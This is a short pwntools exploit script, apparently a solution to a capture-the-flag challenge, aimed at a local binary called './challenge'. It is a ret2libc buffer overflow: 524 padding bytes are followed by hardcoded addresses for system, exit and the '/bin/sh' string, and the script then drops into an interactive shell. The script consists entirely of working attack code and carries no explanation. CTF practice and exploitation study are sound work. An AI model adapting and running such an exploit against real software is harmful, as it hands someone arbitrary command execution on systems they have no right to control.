from pwn import *

# Set context
context.binary = './challenge'
context.terminal = ['tmux', 'splitw', '-h']

# Construct payload
offset = 524
system = p32(0xf7dd58e0)
exit = p32(0xf7dc45b0)
binsh = p32(0xf7f42de8)

payload = b"A" * offset + system + exit + binsh

# Start process
p = process('./challenge')
p.sendlineafter("name?\n", payload)
p.interactive()
